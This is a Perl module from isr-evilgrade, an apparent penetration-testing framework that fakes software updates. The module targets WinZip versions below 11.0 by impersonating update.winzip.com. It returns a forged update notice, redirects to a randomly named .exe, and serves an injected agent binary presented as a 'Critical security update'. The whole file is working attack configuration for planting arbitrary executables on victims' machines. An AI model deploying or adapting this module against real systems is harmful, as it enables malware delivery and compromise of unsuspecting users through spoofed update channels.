###############
# winzip.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::winzip;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'Winzip',
    'version'     => '1.0',
    'appver'      => '< 11.0',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'update.winzip.com',
    'request'     => [
        {   'req' => '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)'
            ,    #regex friendly #10.0
            'type'   => 'string',    #file|string|agent|install
            'method' => '',          #any
            'bin'    => 0,

            #'string' => "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
            'string' =>
                '<!-- 01007da91898b3199fe8846cd0a315d4800cc8c5db3ee899e6431c6082fea3fdab8891ffb7b60637e99a12cd4820561aeff53dd326d5061757efe272f78cf1fb6a7689737e69aea62c07d8612732c2124eb9e21e9b6436d350169cf2bbd7ee52c33ac7bb2251adc23ba3210c2741e0cd6818606da82af7e236ab83a079087f6f51b1 -->
            <updateinfo version="1">
             <currver maj="24" min="0" build="8519" rev="0" />
              <text><![CDATA[Una nueva version disponible:\n\nWinZip 12.1 Buld 8519e\n\n - WinZip 12.1 es una actualizaci�n de WinZip 12.0. Esta actualizaci�n presenta la nueva extensi�n de formato de Zip (.zipx), dando como resultado archivos de WinZip m�s eficientes hasta el momento, y la opci�n para "cambiar el tama�o de las im�genes" incorporado en la funci�n "Zip and Email" que permite a los usuarios compartir fotos a trav�s de archivos adjuntos de correo electr�nico.\n]]></text>
              </updateinfo>
              ',
            'parse' => 1,
            'file'  => '',
        },
        {   'req'    => '/dnldwz.cgi',    #regex friendly
            'type'   => 'string',         #file|string|agent|install
            'method' => '',               #any
            'bin'    => 0,
            'string' =>
                '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
            'parse' => 1,
            'file'  => '',
        },

        {   'req'    => '.exe',           #regex friendly
            'type'   => 'agent',          #file|string|agent|install
            'method' => '',               #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
